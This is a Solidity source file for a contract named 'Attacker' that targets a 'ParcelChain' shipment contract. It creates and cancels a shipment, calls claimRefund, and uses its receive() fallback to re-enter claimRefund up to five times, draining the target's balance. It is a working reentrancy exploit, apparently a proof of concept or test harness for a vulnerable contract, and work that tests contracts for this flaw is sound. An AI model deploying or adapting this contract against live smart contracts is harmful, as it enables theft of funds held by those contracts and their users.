// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "./ParcelChain.sol";

contract Attacker {
    ParcelChain public target;
    uint256 public shipmentId;
    uint256 public attackCount;
    uint256 public constant MAX_REENTER = 5;

    constructor(address payable targetAddress) {
        target = ParcelChain(targetAddress);
    }

    function createAndCancel(address receiver, uint256 deadline) external payable returns (uint256) {
        shipmentId = target.createShipment{value: msg.value}(receiver, deadline);
        target.cancelShipment(shipmentId);
        return shipmentId;
    }

    function attack(uint256 id) external {
        shipmentId = id;
        attackCount = 0;
        target.claimRefund(id);
    }

    receive() external payable {
        if (attackCount < MAX_REENTER && address(target).balance > 0) {
            attackCount++;
            try target.claimRefund(shipmentId) {} catch {}
        }
    }

    function withdraw() external {
        payable(msg.sender).transfer(address(this).balance);
    }

    function balance() external view returns (uint256) {
        return address(this).balance;
    }
}